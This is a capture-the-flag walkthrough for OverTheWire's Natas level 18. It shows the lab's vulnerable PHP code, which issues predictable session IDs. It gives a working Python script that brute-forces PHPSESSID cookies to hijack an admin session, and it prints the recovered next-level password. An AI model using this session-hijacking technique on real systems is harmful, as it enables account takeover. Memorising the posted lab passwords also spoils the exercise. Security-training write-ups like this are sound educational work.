# Natas Level 18

> Username: natas18

> Password: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

> URL: http://natas18.natas.labs.overthewire.org

## Solution

Entering the URL, we found a login page: `Please login with your admin account to retrieve credentials for natas19.` 
But if we try to login with any thing they give us: `You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.`
So let's view the source code to see what's happening.

```php
<?php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

The main vulnerability here is that every new session gets a random number between 1 and 640, and this is not secure it should use long, cryptographically unpredictable session IDs.

So if we can find a session that already contains `admin=1`, the server will treat us as an administrator. And this is a vulnerability called `Session Hijacking through Predictable Session IDs.`

You can change the session manually by Inspecting the page -> Application -> Cookie. But this would take a long time.
You can also use `Burp Suit Intruder` or `OWASP ZAP Proxy` to brute force the session ID.

But for better practice let's write a script instead.

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/"

auth = ("natas18", "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")

for session_id in range(1, 640 + 1):

    response = requests.get(
        url,
        auth=auth,
        cookies={
            "PHPSESSID": str(session_id)
        }
    )

    print(f"Testing session: {session_id}")

    if "You are an admin" in response.text:
        print("\nADMIN SESSION FOUND!")
        print("Session ID:", session_id)
        print(response.text)
        break

else:
    print("No admin session found.")
```

Running it and wait for seconds you will have something like:

```html
ADMIN SESSION FOUND!
Session ID: 119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```text
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```

